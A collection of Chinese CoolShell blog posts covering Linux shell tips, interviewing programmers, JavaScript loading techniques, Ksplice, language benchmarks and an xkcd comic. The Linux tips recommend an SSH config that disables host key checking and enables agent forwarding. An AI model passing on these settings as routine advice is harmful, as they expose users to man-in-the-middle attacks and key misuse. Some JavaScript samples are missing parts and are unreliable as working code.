（全文完）文章：来源*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 应该知道的Linux技巧作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这篇文章来源于Quroa的一个问答《What are some time-saving tips that every Linux user should know?》—— Linux用户有哪些应该知道的提高效率的技巧。我觉得挺好的，总结得比较好，把其转过来，并加了一些自己的理解。 首先，我想告诉大家， **在Unix/Linux下，最有效率技巧的不是操作图形界面，而是命令行操作，因为命令行意味着自动化** 。如果你看过《你可能不知道的Shell》以及《28个Unix/Linux的命令行神器》你就会知道Linux有多强大，这个强大完全来自于命令行，于是，就算你不知道怎么去做一个环保主义的程序员，至少他们可以让你少熬点夜，从而有利于你的身体健康和性生活。下面是一个有点长的列表，正如作者所说，你并不需要知道所有的这些东西，但是如果你还在很沉重地在使用Linux的话，这些东西都值得你看一看。 （注：如果你想知道下面涉及到的命令的更多的用法，你一定要man一点。对于一些命令，你可以需要先yum或apt- get来安装一下，如果有什么问题，别忘了Google。如果你要Baidu的话，我仅代表这个地球上所有的生物包括微生物甚至细菌病毒和小强BS你到宇宙毁灭）
#### 基础* **学习Bash **。你可以man bash来看看bash的东西，并不复杂也并不长。你用别的shell也行，但是bash是很强大的并且也是系统默认的。（学习zsh或tsch只会让你在很多情况下受到限制）* **学习 vim** 。在Linux下，基本没有什么可与之竞争的编 ~~译~~ 辑器（就算你是一个Emacs或Eclipse的重度用户）。你可以看看《简明vim攻略》和 《Vim的冒险游戏》以及《给程序员的Vim速查卡》还有《把Vim变成一个编程的IDE》等等。* **了解 ssh** 。明白不需要口令的用户认证（通过ssh-agent, ssh-add），学会用ssh翻墙，用scp而不是ftp传文件，等等。你知道吗？scp 远端的时候，你可以按tab键来查看远端的目录和文件（当然，需要无口令的用户认证），这都是bash的功劳。* **熟悉bash的作业管理** ，如： &, Ctrl-Z, Ctrl-C, jobs, fg, bg, kill, 等等。当然，你也要知道Ctrl+\（SIGQUIT）和Ctrl+C （SIGINT）的区别。* **简单的文件管理** ： ls 和 ls -l (你最好知道 “ls -l” 的每一列的意思), less, head, tail 和 tail -f, ln 和 ln -s (你知道明白hard link和soft link的不同和优缺点), chown, chmod, du (如果你想看看磁盘的大小 du -sk *), df, mount。当然，原作者忘了find命令。
* **基础的网络管理** ： ip 或 ifconfig, dig。当然，原作者还忘了如netstat, ping, traceroute, 等* **理解正则表达式** ，还有grep/egrep的各种选项。比如： -o, -A, 和 -B 这些选项是很值得了解的。* **学习使用 apt-get 和 yum 来查找和安装软件** （前者的经典分发包是Ubuntu，后者的经典分发包是Redhat），我还建议你试着从源码编译安装软件。**日常*** 在 bash 里，使用 Ctrl-R 而不是上下光标键来查找历史命令。* 在 bash里，使用 Ctrl-W 来删除最后一个单词，使用 Ctrl-U 来删除一行。请man bash后查找Readline Key Bindings一节来看看bash的默认热键，比如：Alt-. 把上一次命令的最后一个参数打出来，而Alt-* 则列出你可以输入的命令。* 回到上一次的工作目录： cd – （回到home是 cd ~）* 使用 xargs。这是一个很强大的命令。你可以使用-L来限定有多少个命令，也可以用-P来指定并行的进程数。如果你不知道你的命令会变成什么样，你可以使用xargs echo来看看会是什么样。当然， -I{} 也很好用。示例：
* pstree -p 可以帮你显示进程树。（读过我的那篇《一个fork的面试题》的人应该都不陌生）* 使用 pgrep 和 pkill 来找到或是kill 某个名字的进程。 (-f 选项很有用).* 了解可以发给进程的信号。例如：要挂起一个进程，使用 kill -STOP [pid]. 使用 man 7 signal 来查看各种信号，使用kill -l 来查看数字和信号的对应表* 使用 nohup 或 disown 如果你要让某个进程运行在后台。* 使用netstat -lntp来看看有侦听在网络某端口的进程。当然，也可以使用 lsof。* 在bash的脚本中，你可以使用 set -x 来debug输出。使用 set -e 来当有错误发生的时候abort执行。考虑使用 set -o pipefail 来限制错误。还可以使用trap来截获信号（如截获ctrl+c）。* 在bash 脚本中，subshells (写在圆括号里的) 是一个很方便的方式来组合一些命令。一个常用的例子是临时地到另一个目录中，例如：> >     # do something in current dir >     (cd /some/other/dir; other-command) >     # continue in original dir
* 在 bash 中，注意那里有很多的变量展开。如：检查一个变量是否存在: ${name:?error message}。如果一个bash的脚本需要一个参数，也许就是这样一个表达式 input_file=${1:?usage: $0 input_file}。一个计算表达式： i=$(( (i + 1) % 5 ))。一个序列： {1..10}。 截断一个字符串： ${var%suffix} 和 ${var#prefix}。 示例： if var=foo.pdf, then echo ${var%.pdf}.txt prints “foo.txt”.* 通过 <(some command) 可以把某命令当成一个文件。示例：比较一个本地文件和远程文件 /etc/hosts： diff /etc/hosts <(ssh somehost cat /etc/hosts)* 了解什么叫 “here documents” ，就是诸如 cat <<EOF 这样的东西。* 在 bash中，使用重定向到标准输出和标准错误。如： some-command >logfile 2>&1。另外，要确认某命令没有把某个打开了的文件句柄重定向给标准输入，最佳实践是加上 “</dev/null”，把/dev/null重定向到标准输入。
* 使用 man ascii 来查看 ASCII 表。* 在远端的 ssh 会话里，使用 screen 或 dtach 来保存你的会话。（参看《28个Unix/Linux的命令行神器》）* 要来debug Web，试试curl 和 curl -I 或是 wget 。我觉得debug Web的利器是firebug，curl和wget是用来抓网页的，呵呵。* 把 HTML 转成文本： lynx -dump -stdin* 如果你要处理XML，使用 xmlstarlet* 对于 Amazon S3， s3cmd 是一个很方便的命令（还有点不成熟）* 在 ssh中，知道怎么来使用ssh隧道。通过 -L or -D (还有-R) ，翻墙神器。* 你还可以对你的ssh 做点优化。比如，.ssh/config 包含着一些配置：避免链接被丢弃，链接新的host时不需要确认，转发认证，以前使用压缩（如果你要使用scp传文件）：> >     TCPKeepAlive=yes >     ServerAliveInterval=15 >     ServerAliveCountMax=6 >     StrictHostKeyChecking=no >     Compression=yes >     ForwardAgent=yes
* 如果你有输了个命令行，但是你改变注意了，但你又不想删除它，因为你要在历史命令中找到它，但你也不想执行它。那么，你可以按下 Alt-# ，于是这个命令关就被加了一个#字符，于是就被注释掉了。**数据处理*** 了解 sort 和 uniq 命令 (包括 uniq 的 -u 和 -d 选项).* 了解用 cut, paste, 和 join 命令来操作文本文件。很多人忘了在cut前使用join。* 如果你知道怎么用sort/uniq来做集合交集、并集、差集能很大地促进你的工作效率。假设有两个文本文件a和b已解被 uniq了，那么，用sort/uniq会是最快的方式，无论这两个文件有多大（sort不会被内存所限，你甚至可以使用-T选项，如果你的/tmp目录很小）> >     cat a b | sort | uniq > c   # c is a union b 并集 >   >     cat a b | sort | uniq -d > c   # c is a intersect b 交集 >   >     cat a b b | sort | uniq -u > c   # c is set difference a - b 差集
* 了解和字符集相关的命令行工具，包括排序和性能。很多的Linux安装程序都会设置LANG 或是其它和字符集相关的环境变量。这些东西可能会让一些命令（如：sort）的执行性能慢N多倍（注：就算是你用UTF-8编码文本文件，你也可以很安全地使用ASCII来对其排序）。如果你想Disable那个i18n 并使用传统的基于byte的排序方法，那就设置export LC_ALL=C （实际上，你可以把其放在 .bashrc）。如果这设置这个变量，你的sort命令很有可能会是错的。* 了解 awk 和 sed，并用他们来做一些简单的数据修改操作。例如：求第三列的数字之和： awk ‘{ x += $3 } END { print x }’。这可能会比Python快3倍，并比Python的代码少三倍。* 使用 shuf 来打乱一个文件中的行或是选择文件中一个随机的行。* 了解sort命令的选项。了解key是什么（-t和-k）。具体说来，你可以使用-k1,1来对第一列排序，-k1来对全行排序。* Stable sort (sort -s) 会很有用。例如：如果你要想对两例排序，先是以第二列，然后再以第一列，那么你可以这样： sort -k1,1 | sort -s -k2,2
* 我们知道，在bash命令行下，Tab键是用来做目录文件自动完成的事的。但是如果你想输入一个Tab字符（比如：你想在sort -t选项后输入<tab>字符），你可以先按Ctrl-V，然后再按Tab键，就可以输入<tab>字符了。当然，你也可以使用$’\t’。* 如果你想查看二进制文件，你可以使用hd命令（在CentOS下是hexdump命令），如果你想编译二进制文件，你可以使用bvi命令（ 墙）* 另外，对于二进制文件，你可以使用strings（配合grep等）来查看二进制中的文本。* 对于文本文件转码，你可以试一下 iconv。或是试试更强的 uconv 命令（这个命令支持更高级的Unicode编码）* 如果你要分隔一个大文件，你可以使用split命令（split by size）和csplit命令（split by a pattern）。**系统调试*** 如果你想知道磁盘、CPU、或网络状态，你可以使用 iostat, netstat, top (或更好的 htop), 还有 dstat 命令。你可以很快地知道你的系统发生了什么事。关于这方面的命令，还有iftop, iotop等（参看《28个Unix/Linux的命令行神器》）
* 要了解内存的状态，你可以使用free和vmstat命令。具体来说，你需要注意 “cached” 的值，这个值是Linux内核占用的内存。还有free的值。* Java 系统监控有一个小的技巧是，你可以使用kill -3 <pid> 发一个SIGQUIT的信号给JVM，可以把堆栈信息（包括垃圾回收的信息）dump到stderr/logs。* 使用 mtr 会比使用 traceroute 要更容易定位一个网络问题。* 如果你要找到哪个socket或进程在使用网络带宽，你可以使用 iftop 或 nethogs。* Apache的一个叫 ab 的工具是一个很有用的，用quick-and-dirty的方式来测试网站服务器的性能负载的工作。如果你需要更为复杂的测试，你可以试试 siege。* 如果你要抓网络包的话，试试 wireshark 或 tshark。* 了解 strace 和 ltrace。这两个命令可以让你查看进程的系统调用，这有助于你分析进程的hang在哪了，怎么crash和failed的。你还可以用其来做性能profile，使用 -c 选项，你可以使用-p选项来attach上任意一个进程。
* 了解用ldd命令来检查相关的动态链接库。注意：ldd的安全问题* 使用gdb来调试一个正在运行的进程或分析core dump文件。参看我写的《GDB中应该知道的几个调试方法》* 学会到 /proc 目录中查看信息。这是一个Linux内核运行时记录的整个操作系统的运行统计和信息，比如： /proc/cpuinfo, /proc/xxx/cwd, /proc/xxx/exe, /proc/xxx/fd/, /proc/xxx/smaps.* 如果你调试某个东西为什么出错时，sar命令会有用。它可以让你看看 CPU, 内存, 网络, 等的统计信息。* 使用 dmesg 来查看一些硬件或驱动程序的信息或问题。作者最后加了一个免责声明：Disclaimer: Just because you _can_ do something in bash, doesn’t necessarily mean you should. ;) （全文完）# AES加密算法动画演示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn波士顿大学的Howard Straubing做了这么一个动画来展示AES加密算法的演示，挺不错的。
点击这里看全屏# 再谈“我是怎么招聘程序员的”（下）作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn****< <<再谈“我是怎么招聘程序员的”（上）****在上篇中，我们说到了一些认识人的方法（操作，知识，经验，能力），还有一些面试的方法（算法题，实际生产活动中的挑战），下面我们来说说，面试的风格，还有一些点评。 ** **   ****#### 把应聘者当成你的同事有些公司的面试官，在面试过程中问你一个算法题，然后等着你解答了，如果你给出一个答案，然后就会问你有没有更好的答案，如果你给出了正确的答案，他们就会问你一个更难的问题，如此循环下去。他们基本上很少给你提示，甚至不停地质问你，挑战你，搞得应聘者很紧张。另外，有很多问题是没有标准答案的，或者说是，同一个答案的描述方法有多种，很多面试官会觉得你没有回答到他想要的答案，因此表现得有对你不屑，并表现出你不行的样子，并觉得你的能力有问题。真是可笑了。比如我一个朋友在回答什么是异步的问题时，举例说明了异步调用就是不能处理完就返回，并且需要传递一个回调函数给调用方以便完成后回调通知结果。这样的回答并没有错，但是这并不符合面试官心里想要的答案，面试官对此并不满意，进而认为我这个朋友还需要去多读读书。
我相信大多数面试官都会这样干的。我想问问这样的面试官， **你们有没有用面试的方式对过你的同事？在你的工作场景中，你会不会用面试的风格和你的同事进行交流和说话？** 不妨让我们来问我们自己下面几个问题：* 你在工作当中遇到难题时你是怎么解决的？你会和人讨论吗？你只用15分钟就能得出最优解吗？   * 你在工作当中解决难题时是否会有一个人在旁边质问你并给你压力吗？   * 你在工作当中会为难你的同事吗？会让你的同事紧张吗？你觉得在紧张的状态下能做好工作吗？   * 你在工作中觉得同事的回答并不是你想要的答案，不是符合你的答案，你会认为你的同事不行吗？   * 你的成长过程是什么样的？在是压力和天天被人质问的情况下成长的吗？   * 大家都知道学校里应试教育的弊端，你觉得你的面试是不是一种应试呢？   （看看这么多的应聘者们都在做各种各样的算法题，这不就是一种应试吗？）想一想你的日常工作，问自己一下上面这些问题，想一想你自己的成长过程，想一想你和你的同事是怎么相处的，想一想你的日常工作中是什么样的，相信你自己也能得出结论的。如果你把应聘者当成自己未来的同事，那么你的面试会有下面的收获：* 面试的气氛会很不错，应聘者会放松，表现自然，更接受于真实的状态。   * 面试中的交流和互动（而不是一问一答）会让你更全面的考查和了解一个人。   * 非应试的面试，会让你了解得更多。   * 真实的了解一个人，你才能做出真正正确的结论。
#### 向应聘者学习下面有几个观点* 面试的过程是一个相互学习的过程，并不是你为难面试者的过程。   * 一问一答是很一种呆板死板的过程，相互讨论相互学习，有良好的互动才是好的面试过程。   * 面试官要证明的不是你有多强有多聪明，而是要挖掘应聘者的优势和能力。   * 面试官用为自己的问题预设好一个标准答案，看看应聘者能为你带来什么。   * 向来应聘的人学习，而不是刁难。**无论你多牛，要难倒你实在是太容易了。出难题不是目的，难倒人也很容易，出难题只不过是用来了解应聘者能力的一个手段，而不是面试的全部** 。我不知道你喜欢不喜欢一些竞技类的运动？比如踢球，打篮球，羽毛球，下象棋等，你一般想和什么样的人玩？是差的，还是强的？所以， **能够从面试者那里学到东西，喜欢和面试者一起工作，这才是面试真正的目的** 。对于一个团队来说，如果大家都是一样的想法，一样的主张，一样的倾向，那么这个团队最终会是一个闭塞的团队，你如果不能真正接纳不同想法的人，不同主张的人，那么你也将失去进步的机会。 **如果你的团队总是在招入和你一样的人，那么你的团队怎么可能会有out-of-box的想法呢？世界因为不同而美好** 。
另外，对于公司来说， **如果你招进来的人还不如已经有的人，作为一个公司，你又怎么能有更好的人让你的公司进步呢** ？所以，面试应该是向面试者学习的一个过程。当然， **如果你从他身上学不到什么，那么你就教他一些吧。这样，就算是面试不通过，面试者也会欣然接受的** 。不然，让面试者产生一些负面情绪，出去说一些不好的话，也有损你和公司的形象。#### 一些相关的点评下面是我根据酷壳的一些面试题的文章)后的回复、还有我朋友的经历，还有这篇有关豆瓣的产品经理的这篇文章的一些点评。大家可以看看我从这些地方看到东西靠不靠谱。**酷壳的面试题中的答复**先说酷壳的那篇“火柴棍式的面试题”，这个面试题其实很没什么意思。主要考查你对代码逻辑的了解程度。因为设置了回复可见答案，所以这篇文章的回复量达千把条。从回复中，我看到：* 一些朋友想不出来就直接看答案了。我可以看出，有一些朋友习惯获得知识，而不习惯独立思考。甚至有畏难情绪，从另一方面来说，可以看出我国的教育还真不是一般的差。   * 一些朋友想不全。从这点来看，我觉得很正常，尤其是想出两种来的，我可以感觉到他们的努力思考了，可能还做了一些尝试。挺不错的。可惜我看不到你思考的方式，是在纸上画了画，还是编译了个程序跑了跑，还是别的什么。这样我会了解你更多。   * 一些朋友给出的答案中有错的。这说明了这类朋友可能不喜欢做测试，时常想当然，或是做事比较冲动，并不足够严谨。这么简单的程序，验证能花多少精力呢？   * 还有少数的朋友没有看明白题目要求。这说明了这类朋友太粗心了，在工作当中可能会表现为误解需求和别人的话。沟通有问题。
再说说那篇“火车运煤”的问题，这个面试题我觉得主要是看看大家的解题思路，表达能力。* 首先，我很惊喜有人很快就用数学做了解答，很不错，这个人的数学功底很不错。能用数学解题的人一般来说都是算法比较强的人。   * 有人说抱怨我没有说火车可以调头回去，所以没有想到这样的方法。如果是在面试中我会做提示的。我不会因为你不知道调头这个潜规则而否定你的。当然，如果你能想到的话说明你的脑袋还是比较灵的。   * 还有很多人说他的方法比较土，只运了400吨煤，416吨的或333吨，一看就是没有看提示的，我觉得这些人能够通过独立思考找到方法，这类的人其实已经不错了。顺着这个思路优化也只是时间的问题了。   * 更可喜的是，我看到了有一些朋友在看到别人的更好的方法后和自己的方法进行了比较，并找到了为什么自己的方法不如他的原因。这样的人我认为是懂得“总结”和“比较”的，这样的人总是在不断地学习和改善自己的。   * 还有人说到了动态规划，如果是在面试的时候，我很想向这位朋友学习一下用动态规划来解这题。   * 还有朋友说到了火车调头只能在有站的地方。这个朋友一看要么就是搞需求分析的人，要么就是较真的人。需要进一步了解。但不管怎么样，这样的朋友的观察能力是很不错的。   * 还有一些朋友给出的答案是正确的。但是表达方面比较复杂，有些没有看懂。可见，解题 的能力是有的，只是表达能力还有待提高。
**豆瓣产品经理的面试**再说说豆瓣上的这篇文章，那篇文章里，面试官问了一个比较大的问题，那是仁者见仁，智者见智的问题，并且面试官并不满意应聘者给出的答案，并在用其主观意识强加一些东西给应聘者，并不断地和应聘者纠缠。后来，面试官回复到“重点测了两个问题：一是判别事情的标准和方法；二是在多种PK下产品经理的压力反应”。下面是我观察到的：* 其一、这种似事而非的仁者见仁，智者见仁，一万人有一万个答案。所以，这种怎么答都可以的问题是很难有标准的，我认为豆瓣的面试官以这种问题来考查面试者的标准太有问题了。更好的问题是：比较一下新浪和twitter这两个产品。   * 其二、多种想法PK的压力反应。这点没有问题，如果有机会我想问问这位面试官，豆瓣产品经理们的PK各自的想法时是以这种纠缠的方式吗？如果是这样的话，那我很为你们担忧啊。   * 其三、很明显，应聘者不知道面试官想说什么，所以应聘者总是给出一些模棱两可的回答。回答得很政客，呵呵。   * 其四、问的问题都是一些假设性的问题，假设技术人员不可沟通。人家说了，还没有见过不能沟通的情况。结果还要继续追问。这样你既要观察不到你想要的，也搞得大家不愉快。更好的问题的：“请你给一个你和一个很难沟通的人沟通的示例”，或是当应聘者说了“坚持己见”的时候，也应该追问“能给一个你坚持己见的例子吗？”。   * 其五、整个面试过程完全是在谈一些虚的东西，就像天上的浮云，一点实实在在的东西都没有。比如下面这两个实实在在的问题：“你以前设计过什么产品？”，“你和你的技术团队是怎么合作的？”
这是一个完完全全失败的面试，这个面试官根本不懂面试，甚至工作方法也可能很有问题。也许他只是想找一个能够在工作中附和他的人。**朋友的面试**最后说说我那个朋友的面试，我的这个朋友学习能力很强，也很好专研，工作中解决了很多很困难甚至很底层的问题。他做软件开发时间并不长，但是他对这个行业很有热情，也很执着，并有着相当不错的技术功底。这天他遇到了一个面试官，根据朋友的描述，这位面试官，主要问题了三个问题，一个是关于异步的，一个是关于性能调优的，还有一个是关于学习能力的。* 问到异步的问题，我这个朋友说到了多线程中的异步调用，但是他可能问的是网络或是业务中的异步，要不然就是Linux 内核中的异步，当然他也没有说清楚，但他很不满意我朋友的答案，并让我朋友回去多看看书。   * 问到性能调优的问题时，我这个朋友说了性能调优分三级，业务级，指令级和CPU级，并举例说了使用了一个叫VTune的性能分析工具。面试官却说原来你只懂Windows，有点不屑，并说他只会使用商业工具，更不屑。   * 当我朋友向他澄清问题时，面试官只是摇头，叹气。并在应聘者作答的过程中不断的打断对方。我的看法如下：* 对于异步来说，我认为这是一种设计或是一种想法，可能会有很多种不同的实现方式，在不同的场景中会有不同的用法。面试官并没有考查应聘者对异步方法的理解，也没有考查异步方法可以用来解决什么，异步方法的优势和劣势，等等。只是觉得应聘者没有给出他想要的答案。   * 对于性调优的问题，我认为应聘者的思路和知识都很不错，还有使用VTune的经验。无论使用Windows还是Linux，无论使用商业的还是开源的Profiler，很多东西都是相通的，怎么能够因为这个东西不对自己的口味而下结论。为什么不向人家学习一下VTune呢？使用工具只是操作技能啊。   * 面试官应该是用微笑来鼓励应聘者的，而不是用摇头和叹气，频繁打断对方也是一个相当不好的习惯。看来这个面试官很不能接受不同的东西。
这位有很不错的技术能力的人，看来并不适合做一个面试官，因为他面试的东西都只在知识层次，而且这位面试官有强烈的喜好和倾向，所以，他必然会错过那些有能力但并不合他口味的人。哎，面对这样的面试官，大家伤不起啊！（全文完）**（请勿用于商业用途，转载时请注明作者和出处）**# Javascript 装载和执行作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn一两个月前在淘宝内网里看到一个优化Javascript代码的竞赛，发现有不少的人对Javascript的执行和装载的基础并不懂，所以，从那天起我就想写一篇文章，但一直耽搁了。自上篇《浏览器渲染原理简介》，正好也可以承前启后。首先，我想说一下Javascript的装载和执行。通常来说，浏览器对于Javascript的运行有两大特性： **1）载入后马上执行，2）执行时会阻塞页面后续的内容（包括页面的渲染、其它资源的下载）** 。于是，如果有多个js文件被引入，那么对于浏览器来说，这些js文件被被串行地载入，并依次执行。因为javascript可能会来操作HTML文档的DOM树，所以，浏览器一般都不会像并行下载css文件并行下载js文件，因为这是js文件的特殊性造成的。所以，如果你的javascript想操作后面的DOM元素，基本上来说，浏览器都会报错说对象找不到。因为Javascript执行时，后面的HTML被阻塞住了，DOM树时还没有后面的DOM结点。所以程序也就报错了。
目录* 传统的方式   * document.write方式   * script的defer和async属性   * 动态创建DOM方式   * 按需异步载入js   * 更多#### 传统的方式所以，当你写在代码中写下如下的代码：<script type="text/javascript"     src="https://coolshell.cn/asyncjs/alert.js"></script>基本上来说，head里的 <script>标签会阻塞后续资源的载入以及整个页面的生成。我专门做了一个示例你可以看看： **示例一** 。 注意：我的alert.js中只有一句话：alert(“hello world”) ，这更容易让你看到javascript是怎么阻塞后面的东西的。所以，你知道为什么有很多网站把javascript放在网页的最后面了，要么就是动用了window.onload或是docmuemt ready之类的事件。另外，因为绝大多数的Javascript代码并不需要等页面，所以，我们异步载入的功能。那么我们怎么异步载入呢？#### document.write方式于是，你可能以为document.write()这种方式能够解决不阻塞的方式。你当然会觉得，document.write了的<script>标签后就可以执行后面的东西去了，这没错。对于在同一个script标签里的Javascript的代码来说，是这样的，但是对于整个页面来说，这个还是会阻塞。 下面是一段测试代码：
var script = 'https://coolshell.cn/asyncjs/alert.js';loadjs(script);     alert("loadjs() finished!");     </script><script type="text/javascript" language="javascript">     alert("another block");     </script>你觉得alert的顺序是什么？你可以在不同的浏览器里试一试。这里的想关的测试页面： **示例二** 。#### script的defer和async属性IE自从IE6就支持defer标签，如：<script defer type="text/javascript" src="./alert.js" >     </script>对于IE来说，这个标签会让IE并行下载js文件，并且把其执行hold到了整个DOM装载完毕（DOMContentLoaded），多个defer的<script>在执行时也会按照其出现的顺序来运行。最重要的是<script>被加上defer后，其不会阻塞后续DOM的的渲染。但是因为这个defer只是IE专用，所以一般用得比较少。
而我们标准的的HTML5也加入了一个异步载入javascript的属性：async，无论你对它赋什么样的值，只要它出现，它就开始异步加载js文件。但是， async的异步加载会有一个比较严重的问题，那就是它忠实地践行着“载入后马上执行”这条军规，所以，虽然它并不阻塞页面的渲染，但是你也无法控制他执行的次序和时机。你可以看看这个示例去感受一下。支持 async标签的浏览器是：Firefox3.6+，Chrome 8.0+，Safari 5.0+，IE 10+，Opera还不支持（来自这里）所以这个方法也不是太好。因为并不是所有的浏览器你都能行。#### 动态创建DOM方式这种方式可能是用得最多的了。var script = 'https://coolshell.cn/asyncjs/alert.js';     loadjs(script);这个方式几乎成了标准的异步载入js文件的方式，这个方式的演示请参看： **示例三** 。这方式还被玩出了JSONP的东东，也就是我可以为script的src指定某个后台的脚本（如PHP），而这个PHP返回一个javascript函数，其参数是一个json的字符串，返回来调用我们的预先定义好的javascript的函数。你可以看一下这个示例：t.js （这个示例是我之前在微博征集的一个异步ajax调用的小例子） **   **
#### 按需异步载入js上面那个DOM方式的例子解决了异步载入Javascript的问题，但是没有解决我们想让他按我们指定的时机运行的问题。所以，我们只需要把上面那个DOM方式绑到某个事件上来就可以了。比如：**绑在window.load事件上** —— **示例四 ******你一定要比较一下示例四和示例三在执行上有什么不同，我在这两个示例中都专门用了个代码高亮的javascript，看看那个代码高亮的的脚本的执行和我的alert.js的执行的情况，你就知道不同了）`window.load = loadjs("https://coolshell.cn/asyncjs/alert.js")`**绑在特定的事件上** —— **示例五**`<p style="cursor: pointer" onclick="LoadJS()">Click to load alert.js </p>`这个示例很简单了。当你点击某个DOM元素，才会真正载入我们的alert.js。#### 更多但是，绑定在某个特定事件上这个事似乎又过了一点，因为只有在点击的时候才会去真正的下载js，这又会太慢了了。好了，到这里，要抛出我们的终极问题—— **我们想要异步地把js文件下载到用户的本地，但是不执行，仅当在我们想要执行的时候去执行** 。
要是我们有下面这样的方式就好了：var script = document.createElement("script");     script.noexecute = true;     script.src = "alert.js";     document.body.appendChild(script);//后面我们可以这么干     script.execute();可惜的是，这只是一个美丽的梦想，今天我们的Javascript还比较原始，这个“JS梦”还没有实现呢。所以，我们的程序员只能使用hack的方式来搞。有的程序员使用了非标准的script的type来cache javascript。如：`<script type=cache/script src="./alert.js"></script>`因为”cache/script”，这个东西根本就不能被浏览器解析，所以浏览器也就不能把alert.js当javascript去执行，但是他又要去下载js文件，所以就可以搞定了。可惜的是，webkit严格符从了HTML的标准——对于这种不认识的东西，直接删除，什么也不干。于是，我们的梦又破了。
所以，我们需要再hack一下，就像N多年前玩preload图片那样，我们可以动用object标签（也可以动用iframe标签），于是我们有下面这样的代码：然后，我们在的最后调用一下这个函数。请参看一下相关的示例： **示例六**在Chrome下按 Ctrl+Shit+I，切换到network页，你就可以看到下载了alert.js但是没有执行，然后我们再用示例五的方式，因为浏览器端有缓存了，不会再从服务器上下载alert.js了。所以，就能保证执行速度了。关于这种preload这种东西你应该不会陌生了。你还可以使用Ajax的方式，如：var xhr = new XMLHttpRequest();     xhr.open('GET', 'new.js');     xhr.send('');到这里我就不再多说了，也不给示例了，大家可以自己试试去。最后再提两个js，一个是ControlJS，一个叫HeadJS，专门用来做异步load javascript文件的。好了，这是所有的内容了，希望大家看过后能对Javascript的载入和执行，以及相关的技术有个了解。 **同时，也希望各前端高手不吝赐教！**
（全文完）# Ksplice Uptrack — Ubuntu更新不用重启作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnKsplice是马萨诸塞州坎布里奇的一家新兴厂商，它开发的软件可以帮助计算机用户保持其操作系统的安全性而且不需要经常麻烦的重新启动就可升级操作系统，Ksplice被评为麻省理工10万美元创业竞赛的6个入围项目之一。Ksplice是Web/IT类冠军，它将与其他5个类别的入围者争夺总奖金。该公司是去年由四个麻省理工学院校友成立的，Ksplice目前支持Linux内核的更新，但它声称其免重启更新技术工作在目标代码层，可以适用于任何操作系统或者用户空间应用。该公司说，其技术对安全更新来说特别有益，可以解决因不方便重启而使安全更新不能及时生效的问题。昨日他们在剑桥发布了Ksplice解决方案，运用这种技术将实现无缝更新，从企业软件、系统补丁乃至Linux内核的更新都不需要重启就可以直接完成，改变了数十年来计算机运行最新代码需要重启的麻烦问题。相关链接：* Ksplice Uptrack 主页在这里：   * 安装指南在这里：# 程序语言性能比拼
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这个网页，你可以比较各种程序语言的性能：这个页面，安装的是x64 Ubuntu，CPU是Intel® Q6600® 单核。这个网页支持的语言很多，什么C，C++，Java，python，PHP，Erlang，C#，Ruby，……，还有最新的G0语言。在主页上，你可以选择一个语言。比如，我们选择Google的Go语言——Go 6g8g，然后，点击Show按钮，于是，你会看到下面这个界面：!go vs gnuc在这个界面上方，你可以选择两种语言，我们选择的是，上面的是Go 6g8g，而下面是的GNU C，于是下面的图表，是这两个语言各种参数和算法的比较图表。在这个图表中，其实就是“Go的性能” 除以 “C的性能”，所以，* 如果柱状图是大于1的（也就是基线以上的）则说明Go的性能不如C。* 如果柱状图小于1的（也就是基线以下的），说明Go的性能超过了C。再往下，是用来做比较的算法的图表，如下所示。在这个表中，我们可以看到很多算法，单击语言的链接，你就可以看到具体的实现源代码了。!measurements table
（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# xkcd 神图“Click and Drag”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnxkcd对于经常浏览国外网站的朋友一定不会陌生。不过，还是先让我来介绍一下xkcd（维基百科词条）。这是一个漫画网站，它主要是发布一些很简单的随手画的漫画，它主要有四种体裁——浪漫、讽刺、数学 和 语言。也会经常出现一些和IT有关的漫画，比如下面这个漫画—— （懂Unix的人一眼就看懂了，不懂的怎么看也看不懂）本质上来说，xkcd是一种Geek文化，里面的东西都非常的Geek和晦涩，讽刺很辛辣，但很多只有特定人群可以看得懂。而且表达的形式自由到天马行空，飘忽不定。xkcd.com的网站创建者、所有的漫画的作者叫Randall Munroe，他以前在 NASA工作，是那里的Roboticist——机器人专家，80后，同样，也是一个程序员。他还会画漫画。xkcd是他于2005年创建的，他本来只是想把他大学里在记事本里画的漫画放到他的个人主页上，但结果却搞成了一个独立的以漫画为主的网站，他用他画的这些漫画做成T恤卖。为什么要取名叫xkcd，据Munroe说，这四个字母，没有任何意义，就是为了让人不能把他们通过拼成一个单词读出来。现在他全职在搞xkcd.com。他现在一周会更新三次漫画，分别在周一，周三，和周五。
到了2007年5月，xkcd上的漫画才被广泛转载。2008年10月， _The New Yorker_ 杂志对Munroe做了一个采访。2010年3月，xkcd的书里的谜底被解决了，Munroe在旧金山的金门大桥公园里给他的Fans发了255本限量版的书。2012年4月1日愚人节，他的1037 号漫画(“Umwelt”) 会根据不同的IP，浏览器和地址显示不同的漫画。2012年9月19号，xkcd的第1110号图问世了。#### XKCD #1110 神图这个图上面就是三格小漫画，一个小人拿着气球，还有两句耐人寻味的话。而 **这三格漫画图的下面是一个风景图，取名 Click and Drag，也就是让你点住图片拖动。于是你就不能自拔了。**我只所以在前面写了那么多东西，而不是把这个链接放在一开始，就是害怕你点了这个图，就再也不回来了。好了，现在你可以点下面的链接开这个神图了 （你会发现这个图怎么也拖不完，无穷完尽的，所以，还请你先回来） ******Click and Drag****但请你一定还要回来，本文后面还有精彩内容!****这个图一发布，几乎全世界的各大论坛都在疯狂的转载，很多媒体都关注这个漫画，各种技术社区如：reddit 在疯狂地讨论着这个图是怎么实现的，有多大？还有很多人再分析这个图里的内容，这个图里隐藏着很多很有意思的东西，《有2001太空漫游》，有《星球大战》，还有《超级马丽》等等。**
